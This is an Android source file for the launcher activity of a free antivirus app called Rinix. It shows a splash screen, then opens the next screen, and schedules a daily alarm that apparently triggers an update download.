package android.free.antivirus;

import java.util.Calendar;

import android.os.Bundle;
import android.os.CountDownTimer;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.view.Window;
import free.an.droid.antivirus.rinix.R;

public class Rinix extends Activity {

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.activity_rinix);

		setRA(this);

		new CountDownTimer(2000, 1000) {
			public void onFinish() {

				Intent i = new Intent(Rinix.this, M.class);

				startActivity(i);
				finish();

			}

			@Override
			public void onTick(long millisUntilFinished) {

			}
		}.start();

	}

	private void setRA(Context context) {

		Calendar updateTime = Calendar.getInstance();
		updateTime.set(Calendar.HOUR_OF_DAY, 17);
		updateTime.set(Calendar.MINUTE, 38);

		int r = 1 + (int) (Math.random() * 15);

		int s = r * 1000;

		Intent downloader = new Intent(this.getApplicationContext(), Wake_CFU.class);
		PendingIntent recurringDownload = PendingIntent.getBroadcast(
				this.getApplicationContext(), 0, downloader, 0);
		AlarmManager alarms = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
		alarms.setRepeating(AlarmManager.RTC_WAKEUP,
				updateTime.getTimeInMillis() + s, AlarmManager.INTERVAL_DAY,
				recurringDownload);
	}

}
